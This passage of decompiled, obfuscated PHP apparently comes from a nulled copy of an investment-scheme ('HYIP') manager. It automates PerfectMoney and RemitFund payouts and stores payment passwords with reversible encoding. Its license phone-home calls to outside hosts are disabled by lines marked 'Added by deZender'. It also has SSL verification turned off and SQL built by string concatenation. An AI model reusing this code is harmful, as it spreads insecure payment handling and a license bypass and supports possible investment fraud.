          $elnlcasmAP = true;
        }
        else
        {
          $elnlcwcPP = strlen ($elnlcNJga) - strlen ($elnlckjdh);
        }

        while (!$elnlcasmAP)
        {
          $elnlcJsEhC = trim (substr ($elnlcNJga, $elnlcDrTmM + 7, $elnlcwcPP - 7));
          $elnlcNJga = trim (substr ($elnlcNJga, $elnlcwcPP + 8));
          $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlcqgtip ($elnlcJsEhC, 'text');
          $elnlcGryvK[$elnlcMVquv['elnlcuNqG']] = elnlcqgtip ($elnlcJsEhC, 'additional');
          if ($elnlckPIf = stristr ($elnlcNJga, '<error>') === false)
          {
            $elnlcasmAP = true;
          }
          else
          {
            $elnlcDrTmM = strlen ($elnlcNJga) - strlen ($elnlckPIf);
          }

          if ($elnlckjdh = stristr ($elnlcNJga, '</error>') === false)
          {
            $elnlcasmAP = true;
            continue;
          }
          else
          {
            $elnlcwcPP = strlen ($elnlcNJga) - strlen ($elnlckjdh);
            continue;
          }
        }

        $elnlcDitBg = trim (substr ($elnlcDitBg, $elnlcBbyL + 16));
        if ($elnlcqSpb = stristr ($elnlcDitBg, '<errorresponse>') === false)
        {
          $elnlcJGFJ = true;
        }
        else
        {
          $elnlcxoJz = strlen ($elnlcDitBg) - strlen ($elnlcqSpb);
        }

        if ($elnlcAzaKT = stristr ($elnlcDitBg, '</errorresponse>') === false)
        {
          $elnlcJGFJ = true;
          continue;
        }
        else
        {
          $elnlcBbyL = strlen ($elnlcDitBg) - strlen ($elnlcAzaKT);
          continue;
        }
      }
    }

    return $elnlcGryvK;
  }

  function elnlccsikt ($elnlcVtfRt, $elnlcCOPf)
  {
    global $elnlcMVquv;
    $elnlcJMcCm = strlen ($elnlcCOPf) + 2;
    $elnlczQre = strpos ($elnlcVtfRt, '' . '<' . $elnlcCOPf . ' ');
    $elnlcDwFn = strpos ($elnlcVtfRt, '' . '<' . $elnlcCOPf . '>');
    if ($elnlczQre !== false)
    {
      $elnlcxoJz = $elnlczQre;
    }

    if ($elnlcDwFn !== false)
    {
      $elnlcxoJz = $elnlcDwFn;
    }

    if ($elnlcxoJz === false)
    {
      return '';
    }

    if ($elnlcBbyL = strpos ($elnlcVtfRt, '' . '</' . $elnlcCOPf . '>') === false)
    {
      return '';
    }

    $elnlcgIFL = strpos ($elnlcVtfRt, '>', $elnlcxoJz);
    $elnlcKDxqb = trim (substr ($elnlcVtfRt, $elnlcgIFL + 1, $elnlcBbyL - ($elnlcxoJz + $elnlcJMcCm)));
    return $elnlcKDxqb;
  }

  function elnlcsnag ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcFsom = elnlccsikt ($elnlcykKb, 'Receipt');
    if ($elnlcFsom != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
      $elnlcStjti = $elnlcFsom;
      $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlccsikt ($elnlcStjti, 'ReceiptId');
      $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlccsikt ($elnlcStjti, 'Payer');
      $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlccsikt ($elnlcStjti, 'Payee');
      $elnlcVbRcp = elnlccsikt ($elnlcStjti, 'Equivalent');
      $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlccsikt ($elnlcVbRcp, 'Amount');
      $elnlcGryvK[$elnlcMVquv['elnlcwBFz']] = elnlccsikt ($elnlcVbRcp, 'CurrencyId');
    }

    $elnlcDitBg = elnlccsikt ($elnlcykKb, 'ErrorResponse');
    if ($elnlcDitBg != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
      $elnlcJsEhC = $elnlcDitBg;
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlccsikt ($elnlcJsEhC, 'Text');
      $elnlcGryvK[$elnlcMVquv['elnlcuNqG']] = elnlccsikt ($elnlcJsEhC, 'Additional');
    }

    return $elnlcGryvK;
  }

  function elnlcgvtee ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcFsom = elnlccsikt ($elnlcykKb, 'Receipt');
    if ($elnlcFsom != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
      $elnlcStjti = $elnlcFsom;
      $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlccsikt ($elnlcStjti, 'ReceiptId');
      $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlccsikt ($elnlcStjti, 'Payer');
      $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlccsikt ($elnlcStjti, 'Payee');
      $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlccsikt ($elnlcStjti, 'Amount');
      $elnlcGryvK[$elnlcMVquv['elnlcwBFz']] = elnlccsikt ($elnlcStjti, 'CurrencyId');
    }

    $elnlcDitBg = elnlccsikt ($elnlcykKb, 'Balance');
    if ($elnlcDitBg != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
      $elnlcJsEhC = $elnlcDitBg;
      $elnlcGryvK[$elnlcMVquv['elnlcjUtIe']] = elnlccsikt ($elnlcJsEhC, 'Value');
    }

    $elnlcDitBg = elnlccsikt ($elnlcykKb, 'Error');
    if ($elnlcDitBg != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
      $elnlcJsEhC = $elnlcDitBg;
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlccsikt ($elnlcJsEhC, 'Text');
      $elnlcGryvK[$elnlcMVquv['elnlcuNqG']] = elnlccsikt ($elnlcJsEhC, 'Description');
    }

    return $elnlcGryvK;
  }

  function elnlcywvbr ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcFsom = elnlccsikt ($elnlcykKb, 'Status');
    if (elnlccsikt ($elnlcFsom, 'Code') == $elnlcMVquv['elnlcDwqfa'])
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWqNRN'];
    }
    else
    {
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = $elnlcMVquv['elnlcWOAb'];
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlccsikt ($elnlcykKb, 'Message');
    }

    $elnlcFiUEL = elnlccsikt ($elnlcykKb, 'Balance');
    if ($elnlcFiUEL != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcjUtIe']] = $elnlcFiUEL;
    }

    $elnlcFsom = elnlccsikt ($elnlcykKb, 'Transfer');
    if ($elnlcFsom != '')
    {
      $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlccsikt ($elnlcFsom, 'Payer');
      $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlccsikt ($elnlcFsom, 'Payee');
      $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlccsikt ($elnlcFsom, 'Amount');
      $elnlcGryvK[$elnlcMVquv['elnlcmvxLS']] = elnlccsikt ($elnlcFsom, 'Memo');
      $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlccsikt ($elnlcFsom, 'Batch');
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlccsikt ($elnlcFsom, 'Message');
    }

    return $elnlcGryvK;
  }

  function elnlcikui ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to PerfectMoney account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid PerfectMoney account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 18);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'perfectmoney_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcfxFc = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }
      }
      else
      {
        list ($elnlcfxFc, $elnlcdnrF) = preg_split ('/\\|/', $elnlcgodh);
        $elnlcpvEj[$elnlcMVquv['elnlcomHe']] = $elnlcdnrF;
      }

      $elnlcTQnW = curl_init ();
      $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.perfectmoney.com/acct/confirm.asp');
      curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
      curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcAPxg']]) . '&PassPhrase=' . rawurlencode ($elnlcfxFc) . '&Payer_Account=' . rawurlencode ($elnlcpvEj[$elnlcMVquv['elnlcomHe']]) . '&Payee_Account=' . rawurlencode ($elnlcpGcN) . '&Amount=' . rawurlencode ($elnlcusGj) . ('' . '&Memo=' . $elnlcSFSSt));
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcwpyy = array ();
      if (preg_match ('/<input name=\'PAYMENT_BATCH_NUM\' type=\'hidden\' value=\'(\\d+)\'>/ims', $a, $elnlcwpyy))
      {
        return array (1, '', $elnlcwpyy[1]);
      }
      else
      {
        if (preg_match ('/<input name=\'ERROR\' type=\'hidden\' value=\\\'(.*?)\\\'>/ims', $a, $elnlcwpyy))
        {
          $elnlcexQhV = preg_replace ('/&lt;/i', '<', $elnlcwpyy[1]);
          $elnlcexQhV = preg_replace ('/&gt;/i', '>', $elnlcexQhV);
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcexQhV);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ('' . ' ' . $elnlcexQhV), '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcvubh . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcffbr ($elnlcgodh, $elnlcusGj, $elnlcpGcN, $elnlcSFSSt, $elnlcvubh)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlczzIb']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcpGcN == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty RemitFund account.\'';
      mysql_query ($q);
      return array (0, 'Invalid RemintFund account', '');
    }

    list ($elnlcvmju, $elnlcSsmhm) = elnlcoaka ($elnlcpGcN, 25);
    if ($elnlcvmju == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcSsmhm . '\'';
      mysql_query ($q);
      return array (0, $elnlcSsmhm);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcgodh == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'remitfund_password\'';
        $elnlcOsDxl = mysql_query ($q);
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          $elnlcPJLf = elnlcdxpe ($elnlcweaeO[$elnlcMVquv['elnlcCCsn']], $elnlcMVquv['elnlcQlDcy']);
        }

        $elnlcbyWlj = $elnlcpvEj[$elnlcMVquv['elnlcKqEr']];
      }
      else
      {
        list ($elnlcPJLf, $elnlcbyWlj) = preg_split ('/\\|/', $elnlcgodh);
      }

      $elnlcTQnW = curl_init ();
      $elnlcWELI = strtoupper (md5 ('' . $elnlcbyWlj . 'transferUSD' . $elnlcpvEj[$elnlcMVquv['elnlcSmuqO']] . $elnlcpGcN . $elnlcusGj . strtoupper (md5 ($elnlcPJLf))));
      $elnlcVtfRt = '<TransferRequest>
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcbyWlj) . ('' . '</ApiName>
    <Token>' . $elnlcWELI . '</Token>
  </Auth>
  <Transfer>
    <TransferId></TransferId>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcpvEj[$elnlcMVquv['elnlcSmuqO']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcpGcN, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>USD</CurrencyId>
    <Amount>' . htmlentities ($elnlcusGj, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcSFSSt, ENT_NOQUOTES) . '</Memo>
  </Transfer>
</TransferRequest>';
      $elnlcTQnW = curl_init ();
      curl_setopt ($elnlcTQnW, CURLOPT_URL, 'https://www.remitfund.com/xml/api.php?req=' . urlencode ($elnlcVtfRt));
      curl_setopt ($elnlcTQnW, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
      $elnlcCOgr = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcTQnW, CURLOPT_HTTPHEADER, $elnlcCOgr);
      $a = curl_exec ($elnlcTQnW);
      curl_close ($elnlcTQnW);
      $elnlcGryvK = elnlcpenw ($a);
      if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcJmVy'])
      {
        return array (1, '', $elnlcGryvK[$elnlcMVquv['elnlcNvcv']]);
      }
      else
      {
        if ($elnlcGryvK[$elnlcMVquv['elnlcxBlW']] == $elnlcMVquv['elnlcNEvp'])
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' ' . $elnlcGryvK[$elnlcMVquv['elnlcukssk']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlckjnjt ('' . $elnlcvubh . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlckjnjt ('' . $elnlcvubh . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcvubh . ' Curl functions are not available');
    }

  }

  function elnlcpenw ($elnlcykKb)
  {
    global $elnlcMVquv;
    $elnlcGryvK = array ();
    $elnlcFsom = elnlccsikt ($elnlcykKb, 'Response');
    if ($elnlcFsom != '')
    {
      $elnlcStjti = $elnlcFsom;
      $elnlcGryvK[$elnlcMVquv['elnlcQUpw']] = elnlccsikt ($elnlcStjti, 'Code');
      $elnlcGryvK[$elnlcMVquv['elnlcukssk']] = elnlccsikt ($elnlcStjti, 'Message');
      $elnlcGryvK[$elnlcMVquv['elnlcxBlW']] = ($elnlcGryvK[$elnlcMVquv['elnlcQUpw']] == 0 ? 'ok' : 'error');
      $elnlcGryvK[$elnlcMVquv['elnlcNvcv']] = elnlccsikt ($elnlcStjti, 'TransferId');
      $elnlcGryvK[$elnlcMVquv['elnlcprJRb']] = elnlccsikt ($elnlcStjti, 'Payer');
      $elnlcGryvK[$elnlcMVquv['elnlcvswEV']] = elnlccsikt ($elnlcStjti, 'Payee');
      $elnlcGryvK[$elnlcMVquv['elnlcGRxou']] = elnlccsikt ($elnlcStjti, 'Amount');
      $elnlcGryvK[$elnlcMVquv['elnlcwBFz']] = elnlccsikt ($elnlcStjti, 'Currency');
    }

    return $elnlcGryvK;
  }

  function elnlcdbmlc ($elnlcynvVu, $a)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcfbll ($elnlcynvVu);
    }

    $elnlcyNIk = base64_encode ($elnlcynvVu);
    $a = preg_split ('//', $elnlcyNIk);
    $b = preg_split ('//', md5 ($elnlcynvVu) . base64_encode ($elnlcynvVu));
    $elnlcyNIk = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < sizeof ($a); ++$i)
    {
      if (strlen ($a[$i]) == 0)
      {
        continue;
      }

      $elnlcyNIk = $elnlcyNIk . $a[$i] . $b[$i];
    }

    $elnlcyNIk = str_replace ('=', '!!!^', $elnlcyNIk);
    return elnlcjkdqm ($elnlcyNIk, $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']], $elnlcMVquv['elnlcQlDcy']);
  }

  function elnlcdxpe ($elnlcynvVu, $a)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcfbll ($elnlcynvVu);
    }

    $elnlcynvVu = str_replace ('!!!^', '=', elnlcuuqg ($elnlcynvVu, $elnlcpvEj[$elnlcMVquv['elnlcpNBsd']], 'hyip manager pro 2005 jul 27'));
    $a = preg_split ('//', $elnlcynvVu);
    $elnlcynvVu = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < sizeof ($a); $i += 2)
    {
      $elnlcynvVu .= $a[$i - 1];
    }

    $elnlcyNIk = base64_decode ($elnlcynvVu);
    return $elnlcyNIk;
  }

  function elnlcfbll ($elnlcynvVu)
  {
    global $elnlcMVquv;
    $elnlcyNIk = base64_encode ($elnlcynvVu);
    $a = preg_split ('//', $elnlcyNIk);
    $b = preg_split ('//', md5 ($elnlcynvVu) . base64_encode ($elnlcynvVu));
    $elnlcyNIk = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < sizeof ($a); ++$i)
    {
      $elnlcyNIk = $elnlcyNIk . $a[$i] . $b[$i];
    }

    $elnlcyNIk = str_replace ('=', '!!!^', $elnlcyNIk);
    return $elnlcyNIk;
  }

  function elnlchpbfn ($elnlcynvVu)
  {
    global $elnlcMVquv;
    $elnlcynvVu = str_replace ('!!!^', '=', $elnlcynvVu);
    $a = preg_split ('//', $elnlcynvVu);
    $elnlcynvVu = '';
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < sizeof ($a); $i += 2)
    {
      $elnlcynvVu .= $a[$i - 1];
    }

    $elnlcyNIk = base64_decode ($elnlcynvVu);
    return $elnlcyNIk;
  }

  function elnlcchrz ()
  {
    global $elnlcMVquv;
    global $elnlcvflv;
    global $elnlcpvEj;
return;	// Added by deZender, 2010.01.30
    $elnlcHhpv = ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 1 ? '64.27.18.142' : $elnlcMVquv['elnlccWMx']);
    $elnlcxwcAy = @fopen ($elnlcMVquv['elnlcGsxh'] . $elnlcHhpv . '/check.cgi?domain=' . $elnlcvflv[$elnlcMVquv['elnlcDOEVG']] . '&license=' . $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] . '&zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz', 'r');
    if ($elnlcxwcAy)
    {
      fclose ($elnlcxwcAy);
    }

  }

  function elnlcpxid ()
  {
    global $elnlcMVquv;
    global $elnlcvflv;
    global $elnlcpvEj;
return;	// Added by deZender, 2010.01.30
    $l = '';
    if (function_exists ('curl_init'))
    {
      $i = $elnlcMVquv['elnlcvCqE'];
      while ($i < 2)
      {
        $elnlcTQnW = curl_init ();
        if ($i == 1)
        {
          $elnlcHhpv = '64.27.18.142';
        }
        else
        {
          $elnlcHhpv = 'www.dnsargentina.com.ar';
        }

        $elnlcBeOs = 'http://' . $elnlcHhpv . '/check.cgi?install=1&script=3&domain=' . $elnlcvflv[$elnlcMVquv['elnlcDOEVG']] . '&license=' . $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc';
        curl_setopt ($elnlcTQnW, CURLOPT_URL, $elnlcBeOs);
        curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
        $l = curl_exec ($elnlcTQnW);
        curl_close ($elnlcTQnW);
        if ($l != '')
        {
          $i = $elnlcMVquv['elnlctwRR'];
        }

        ++$i;
      }
    }

    if ($l == '')
    {
      $elnlcxwcAy = @fopen ($elnlcMVquv['elnlcSiyFQ'] . $elnlcvflv[$elnlcMVquv['elnlcDOEVG']] . '&license=' . $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']] . '&cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc', 'r');
      if ($elnlcxwcAy)
      {
        $l = fread ($elnlcxwcAy, 200000);
        fclose ($elnlcxwcAy);
      }
    }

    return $l;
  }

  function elnlcyjlrt ()
  {
    global $elnlcMVquv;
  }

  function elnlcneuth ($elnlcgpSU)
  {
    global $elnlcMVquv;
    global $elnlcvflv;
    global $elnlcpvEj;
return;	// Added by deZender, 2010.01.30
    $elnlcbjcpW = base64_encode ($elnlcgpSU);
    $elnlcTQnW = curl_init ();
    $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
    if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 1)
    {
      $elnlcHhpv = '64.27.18.142';
    }
    else
    {
      if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 2)
      {
        $elnlcHhpv = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcHhpv = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcTQnW, CURLOPT_URL, 'http://' . $elnlcHhpv . $elnlcMVquv['elnlcrfei']);
    curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
    curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcbjcpW . '&domain=' . $elnlcvflv[$elnlcMVquv['elnlcDOEVG']] . '&s=p&license=' . $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']]);
    curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcTQnW);
    curl_close ($elnlcTQnW);
    return chop ($l);
  }

  function elnlcvxaon ($elnlcgpSU, $elnlczHOe = 0)
  {
    global $elnlcMVquv;
    global $elnlcvflv;
    global $elnlcpvEj;
return;	// Added by deZender, 2010.01.30
    if ($elnlczHOe == 1)
    {
      $elnlcbjcpW = substr (trim ($elnlcgpSU), 0, 32);
    }
    else
    {
      $elnlcbjcpW = base64_encode (serialize ($elnlcgpSU));
    }

    $elnlcTQnW = curl_init ();
    $elnlcSFSSt = rawurlencode ($elnlcSFSSt);
    if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 1)
    {
      $elnlcHhpv = '64.27.18.142';
    }
    else
    {
      if ($elnlcpvEj[$elnlcMVquv['elnlcdFbrH']] == 2)
      {
        $elnlcHhpv = 'www.goldcodersmail.com';
      }
      else
      {
        $elnlcHhpv = 'www.dnsargentina.com.ar';
      }
    }

    curl_setopt ($elnlcTQnW, CURLOPT_URL, 'http://' . $elnlcHhpv . $elnlcMVquv['elnlcqRwuh']);
    curl_setopt ($elnlcTQnW, CURLOPT_POST, 1);
    curl_setopt ($elnlcTQnW, CURLOPT_POSTFIELDS, '' . 'in=' . $elnlcbjcpW . '&mode=' . $elnlczHOe . '&domain=' . $elnlcvflv[$elnlcMVquv['elnlcDOEVG']] . '&s=p&license=' . $elnlcpvEj[$elnlcMVquv['elnlcaLrGO']]);
    curl_setopt ($elnlcTQnW, CURLOPT_RETURNTRANSFER, 1);
    $l = curl_exec ($elnlcTQnW);
    curl_close ($elnlcTQnW);
    if ($elnlczHOe == 1)
    {
      $elnlcGryvK = array ();
      if ($l != 'nill')
      {
        $elnlcGryvK = unserialize (base64_decode (chop ($l)));
        if (!is_array ($elnlcGryvK))
        {
          $elnlcGryvK = array ();
        }
      }

      return $elnlcGryvK;
    }
    else
    {
      return chop ($l);
    }

  }

  function elnlcvgfng ($elnlchwPp, $elnlcBvTGu, $elnlcLCJiM, $elnlcRhpt)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $q = '' . 'select * from hm2_emails where id = \'' . $elnlchwPp . '\'';
    $elnlcOsDxl = mysql_query ($q);
    $elnlcweaeO = mysql_fetch_array ($elnlcOsDxl);
    if (!$elnlcweaeO)
    {
      return null;
    }

    if (!$elnlcweaeO[$elnlcMVquv['elnlcxBlW']])
    {
      return null;
    }

    $elnlcmINB = $elnlcweaeO[$elnlcMVquv['elnlcukssk']];
    $elnlcQDnwc = $elnlcweaeO[$elnlcMVquv['elnlcvDUd']];
    $elnlctiTU = $elnlcweaeO[$elnlcMVquv['elnlcwplK']];
    foreach ($elnlcRhpt as $k => $v)
    {
      if (is_array ($v))
      {
        $v = $v[0];
      }

      $elnlcmINB = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcmINB);
      $elnlctiTU = preg_replace ('' . '/#' . $k . '#/', $v, $elnlctiTU);
      if ($elnlcweaeO[$elnlcMVquv['elnlcTFIKb']])
      {
        $elnlcQDnwc = preg_replace ('' . '/#' . $k . '#/', $v, $elnlcQDnwc);
        continue;
      }
    }

    $elnlcmINB = preg_replace ('/#site_name#/', $elnlcpvEj[$elnlcMVquv['elnlcEPxH']], $elnlcmINB);
    if ($elnlcweaeO[$elnlcMVquv['elnlcTFIKb']])
    {
      $elnlcQDnwc = preg_replace ('/#site_name#/', $elnlcpvEj[$elnlcMVquv['elnlcEPxH']], $elnlcQDnwc);
    }

    $elnlctiTU = preg_replace ('/#site_name#/', $elnlcpvEj[$elnlcMVquv['elnlcEPxH']], $elnlctiTU);
    $elnlcmINB = preg_replace ('/#site_url#/', $elnlcpvEj[$elnlcMVquv['elnlcuMNtG']], $elnlcmINB);
    if ($elnlcweaeO[$elnlcMVquv['elnlcTFIKb']])
    {
      $elnlcQDnwc = preg_replace ('/#site_url#/', $elnlcpvEj[$elnlcMVquv['elnlcuMNtG']], $elnlcQDnwc);
    }

    $elnlctiTU = preg_replace ('/#site_url#/', $elnlcpvEj[$elnlcMVquv['elnlcuMNtG']], $elnlctiTU);
    if ($elnlcweaeO[$elnlcMVquv['elnlcTFIKb']])
    {
      $elnlcFKba = elnlcsdrxf (12);
      $elnlcmINB = elnlclqmoa ($elnlcmINB);
      $elnlcQDnwc = elnlckcap ($elnlcQDnwc);
      $elnlcFgpi = '' . '--' . $elnlcFKba . '
Content-Type: text/plain;
Content-Transfer-Encoding: 8bit

' . $elnlcmINB . '

--' . $elnlcFKba . '
Content-Type: text/html;
Content-transfer-encoding: quoted-printable;

' . $elnlcQDnwc . '

--' . $elnlcFKba . '--';
    }
    else
    {
      $elnlcFgpi = $elnlcmINB;
    }

    if ($elnlcpvEj[$elnlcMVquv['elnlcEPxH']] == $elnlcMVquv['elnlcvPEr'])
    {
      $elnlcMHOE = fopen ($elnlcMVquv['elnlcElIPP'], $elnlcMVquv['elnlcFFnOa']);
      fwrite ($elnlcMHOE, '' . 'TO: ' . $elnlcBvTGu . '
From: ' . $elnlcLCJiM . '
Subject: ' . $elnlctiTU . '

' . $elnlcmINB . '

');
      fclose ($elnlcMHOE);
    }
    else
    {
      mail ($elnlcBvTGu, $elnlctiTU, $elnlcFgpi, '' . 'From: ' . $elnlcLCJiM . '
Reply-To: ' . $elnlcLCJiM . ($elnlcweaeO[$elnlcMVquv['elnlcTFIKb']] ? '' . '
Content-Type: multipart/alternative; boundary=' . $elnlcFKba : ''));
    }

  }

  function elnlcqcaem ($elnlcbjcpW)
  {
    global $elnlcMVquv;
    $elnlcbjcpW = str_replace ('
', '
', $elnlcbjcpW);
    $elnlcbjcpW = str_replace ('
', '
', $elnlcbjcpW);
    return $elnlcbjcpW;
  }

  function elnlclqmoa ($elnlcbjcpW)
  {
    global $elnlcMVquv;
    $elnlcnofrn = elnlcqcaem ($elnlcbjcpW);
    if (substr ($elnlcnofrn, 0 - strlen ('
')) != '
')
    {
      $elnlcnofrn .= '
';
    }

    return $elnlcnofrn;
  }

  function elnlckcap ($elnlcbjcpW)
  {
    global $elnlcMVquv;
